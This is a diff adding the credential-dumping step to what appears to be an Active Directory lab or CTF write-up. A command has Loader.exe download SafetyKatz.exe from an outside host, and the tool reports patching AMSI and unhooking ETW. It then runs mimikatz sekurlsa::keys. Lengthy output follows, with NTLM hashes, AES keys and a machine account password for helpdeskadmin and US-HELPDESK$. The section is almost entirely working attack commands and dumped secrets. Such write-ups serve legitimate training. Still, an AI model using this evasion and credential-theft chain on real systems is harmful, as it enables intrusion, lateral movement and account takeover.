@@ -802,3 +802,282 @@ us\administrator
 
 C:\Users\Administrator.US>
 ```
+
+Finally DUmp credentials:
+
+```
+PS C:\Users\Administrator.US> C:\Users\Administrator.US\Loader.exe -path http://192.168.100.17:8989/SafetyKatz.exe
+C:\Users\Administrator.US\Loader.exe -path http://192.168.100.17:8989/SafetyKatz.exe
+[+] Successfully unhooked ETW!
+[+] Successfully patched AMSI!
+[+] URL/PATH : http://192.168.100.17:8989/SafetyKatz.exe Arguments :
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # -path
+ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !
+
+Module :        standard
+Full name :     Standard module
+Description :   Basic commands (does not require module name)
+
+            exit  -  Quit mimikatz
+             cls  -  Clear screen (doesn't work with redirections, like PsExec)
+          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
+          coffee  -  Please, make me a coffee!
+           sleep  -  Sleep an amount of milliseconds
+             log  -  Log mimikatz input/output to file
+          base64  -  Switch file input/output base64
+         version  -  Display some version informations
+              cd  -  Change or display current directory
+       localtime  -  Displays system local date and time (OJ command)
+        hostname  -  Displays system local hostname
+
+mimikatz(commandline) # http://192.168.100.17:8989/SafetyKatz.exe
+ERROR mimikatz_doLocal ; "http://192.168.100.17:8989/SafetyKatz.exe" command of "standard" module not found !
+
+Module :        standard
+Full name :     Standard module
+Description :   Basic commands (does not require module name)
+
+            exit  -  Quit mimikatz
+             cls  -  Clear screen (doesn't work with redirections, like PsExec)
+          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
+          coffee  -  Please, make me a coffee!
+           sleep  -  Sleep an amount of milliseconds
+             log  -  Log mimikatz input/output to file
+          base64  -  Switch file input/output base64
+         version  -  Display some version informations
+              cd  -  Change or display current directory
+       localtime  -  Displays system local date and time (OJ command)
+        hostname  -  Displays system local hostname
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::keys
+
+Authentication Id : 0 ; 1661156 (00000000:001958e4)
+Session           : RemoteInteractive from 2
+User Name         : helpdeskadmin
+Domain            : US
+Logon Server      : US-DC
+Logon Time        : 12/26/2022 3:21:39 AM
+SID               : S-1-5-21-210670787-2521448726-163245708-1120
+
+         * Username : helpdeskadmin
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534
+           rc4_hmac_nt       94b4a7961bb45377f6e7951b0d8630be
+           rc4_hmac_old      94b4a7961bb45377f6e7951b0d8630be
+           rc4_md4           94b4a7961bb45377f6e7951b0d8630be
+           rc4_hmac_nt_exp   94b4a7961bb45377f6e7951b0d8630be
+           rc4_hmac_old_exp  94b4a7961bb45377f6e7951b0d8630be
+
+Authentication Id : 0 ; 1487636 (00000000:0016b314)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:07:54 AM
+SID               : S-1-5-90-0-2
+
+         * Username : US-HELPDESK$
+         * Domain   : us.techcorp.local
+         * Password : _P,6-6-[/Y(bUsRE7z/@/x2o&Aw/A+S.:HY4O"Um?ML"JJeEe>0^Ywi:18Q?:v^GZno&/M]tE-gIF8*8_/W``4SG]+R]#7n[dlTQ_qQ<LwB;t$1p?qCp9?j/
+         * Key List :
+           aes256_hmac       9ff8482457429da3c58f466671a80765f175b14f22ef2d2ee0e12f7db3675e39
+           aes128_hmac       b594b6d5ec804b1cec302f778b5249d0
+           rc4_hmac_nt       76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old      76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_md4           76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_nt_exp   76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old_exp  76c3848cc2e34ef0a8b5751f7e886b8e
+
+Authentication Id : 0 ; 1482867 (00000000:0016a073)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:07:54 AM
+SID               : S-1-5-96-0-2
+
+         * Username : US-HELPDESK$
+         * Domain   : us.techcorp.local
+         * Password : _P,6-6-[/Y(bUsRE7z/@/x2o&Aw/A+S.:HY4O"Um?ML"JJeEe>0^Ywi:18Q?:v^GZno&/M]tE-gIF8*8_/W``4SG]+R]#7n[dlTQ_qQ<LwB;t$1p?qCp9?j/
+         * Key List :
+           aes256_hmac       9ff8482457429da3c58f466671a80765f175b14f22ef2d2ee0e12f7db3675e39
+           aes128_hmac       b594b6d5ec804b1cec302f778b5249d0
+           rc4_hmac_nt       76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old      76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_md4           76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_nt_exp   76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old_exp  76c3848cc2e34ef0a8b5751f7e886b8e
+
+Authentication Id : 0 ; 49903 (00000000:0000c2ef)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 2:38:49 AM
+SID               : S-1-5-90-0-1
+
+         * Username : US-HELPDESK$
+         * Domain   : us.techcorp.local
+         * Password : _P,6-6-[/Y(bUsRE7z/@/x2o&Aw/A+S.:HY4O"Um?ML"JJeEe>0^Ywi:18Q?:v^GZno&/M]tE-gIF8*8_/W``4SG]+R]#7n[dlTQ_qQ<LwB;t$1p?qCp9?j/
+         * Key List :
+           aes256_hmac       9ff8482457429da3c58f466671a80765f175b14f22ef2d2ee0e12f7db3675e39
+           aes128_hmac       b594b6d5ec804b1cec302f778b5249d0
+           rc4_hmac_nt       76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old      76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_md4           76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_nt_exp   76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old_exp  76c3848cc2e34ef0a8b5751f7e886b8e
+
+Authentication Id : 0 ; 30200 (00000000:000075f8)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 12/26/2022 2:38:49 AM
+SID               : S-1-5-96-0-0
+
+         * Username : US-HELPDESK$
+         * Domain   : us.techcorp.local
+         * Password : _P,6-6-[/Y(bUsRE7z/@/x2o&Aw/A+S.:HY4O"Um?ML"JJeEe>0^Ywi:18Q?:v^GZno&/M]tE-gIF8*8_/W``4SG]+R]#7n[dlTQ_qQ<LwB;t$1p?qCp9?j/
+         * Key List :
+           aes256_hmac       9ff8482457429da3c58f466671a80765f175b14f22ef2d2ee0e12f7db3675e39
+           aes128_hmac       b594b6d5ec804b1cec302f778b5249d0
+           rc4_hmac_nt       76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old      76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_md4           76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_nt_exp   76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old_exp  76c3848cc2e34ef0a8b5751f7e886b8e
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : US-HELPDESK$
+Domain            : US
+Logon Server      : (null)
+Logon Time        : 12/26/2022 2:38:48 AM
+SID               : S-1-5-18
+
+         * Username : us-helpdesk$
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       b654a7108a6e384d0e8a57db97dc10afed802f40b419eb7688e821478ccdaf9f
+           rc4_hmac_nt       76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old      76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_md4           76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_nt_exp   76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old_exp  76c3848cc2e34ef0a8b5751f7e886b8e
+
+Authentication Id : 0 ; 1660982 (00000000:00195836)
+Session           : RemoteInteractive from 2
+User Name         : helpdeskadmin
+Domain            : US
+Logon Server      : US-DC
+Logon Time        : 12/26/2022 3:21:39 AM
+SID               : S-1-5-21-210670787-2521448726-163245708-1120
+
+         * Username : helpdeskadmin
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       f3ac0c70b3fdb36f25c0d5c9cc552fe9f94c39b705c4088a2bb7219ae9fb6534
+           rc4_hmac_nt       94b4a7961bb45377f6e7951b0d8630be
+           rc4_hmac_old      94b4a7961bb45377f6e7951b0d8630be
+           rc4_md4           94b4a7961bb45377f6e7951b0d8630be
+           rc4_hmac_nt_exp   94b4a7961bb45377f6e7951b0d8630be
+           rc4_hmac_old_exp  94b4a7961bb45377f6e7951b0d8630be
+
+Authentication Id : 0 ; 1487686 (00000000:0016b346)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 3:07:54 AM
+SID               : S-1-5-90-0-2
+
+         * Username : US-HELPDESK$
+         * Domain   : us.techcorp.local
+         * Password : _P,6-6-[/Y(bUsRE7z/@/x2o&Aw/A+S.:HY4O"Um?ML"JJeEe>0^Ywi:18Q?:v^GZno&/M]tE-gIF8*8_/W``4SG]+R]#7n[dlTQ_qQ<LwB;t$1p?qCp9?j/
+         * Key List :
+           aes256_hmac       9ff8482457429da3c58f466671a80765f175b14f22ef2d2ee0e12f7db3675e39
+           aes128_hmac       b594b6d5ec804b1cec302f778b5249d0
+           rc4_hmac_nt       76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old      76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_md4           76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_nt_exp   76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old_exp  76c3848cc2e34ef0a8b5751f7e886b8e
+
+Authentication Id : 0 ; 49932 (00000000:0000c30c)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 12/26/2022 2:38:49 AM
+SID               : S-1-5-90-0-1
+
+         * Username : US-HELPDESK$
+         * Domain   : us.techcorp.local
+         * Password : _P,6-6-[/Y(bUsRE7z/@/x2o&Aw/A+S.:HY4O"Um?ML"JJeEe>0^Ywi:18Q?:v^GZno&/M]tE-gIF8*8_/W``4SG]+R]#7n[dlTQ_qQ<LwB;t$1p?qCp9?j/
+         * Key List :
+           aes256_hmac       9ff8482457429da3c58f466671a80765f175b14f22ef2d2ee0e12f7db3675e39
+           aes128_hmac       b594b6d5ec804b1cec302f778b5249d0
+           rc4_hmac_nt       76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old      76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_md4           76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_nt_exp   76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old_exp  76c3848cc2e34ef0a8b5751f7e886b8e
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : US-HELPDESK$
+Domain            : US
+Logon Server      : (null)
+Logon Time        : 12/26/2022 2:38:49 AM
+SID               : S-1-5-20
+
+         * Username : us-helpdesk$
+         * Domain   : US.TECHCORP.LOCAL
+         * Password : (null)
+         * Key List :
+           aes256_hmac       b654a7108a6e384d0e8a57db97dc10afed802f40b419eb7688e821478ccdaf9f
+           rc4_hmac_nt       76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old      76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_md4           76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_nt_exp   76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old_exp  76c3848cc2e34ef0a8b5751f7e886b8e
+
+Authentication Id : 0 ; 30249 (00000000:00007629)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 12/26/2022 2:38:49 AM
+SID               : S-1-5-96-0-1
+
+         * Username : US-HELPDESK$
+         * Domain   : us.techcorp.local
+         * Password : _P,6-6-[/Y(bUsRE7z/@/x2o&Aw/A+S.:HY4O"Um?ML"JJeEe>0^Ywi:18Q?:v^GZno&/M]tE-gIF8*8_/W``4SG]+R]#7n[dlTQ_qQ<LwB;t$1p?qCp9?j/
+         * Key List :
+           aes256_hmac       9ff8482457429da3c58f466671a80765f175b14f22ef2d2ee0e12f7db3675e39
+           aes128_hmac       b594b6d5ec804b1cec302f778b5249d0
+           rc4_hmac_nt       76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old      76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_md4           76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_nt_exp   76c3848cc2e34ef0a8b5751f7e886b8e
+           rc4_hmac_old_exp  76c3848cc2e34ef0a8b5751f7e886b8e
+
+```
+
+
